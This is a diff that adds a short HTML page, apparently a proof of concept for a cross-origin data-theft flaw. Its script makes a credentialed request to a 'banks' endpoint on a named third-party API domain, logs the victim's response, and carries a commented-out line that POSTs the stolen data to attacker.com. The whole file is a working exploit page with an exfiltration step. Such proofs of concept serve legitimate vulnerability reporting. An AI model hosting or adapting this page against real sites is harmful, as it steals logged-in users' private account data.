@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://jahad-api.barakatfoundation.com/banks", {
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        console.log("Data:", data);
+        // Optionally send to your server
+        // fetch('https://attacker.com/log', {method:'POST', body:data})
+      });
+    </script>
+  </body>
+</html>
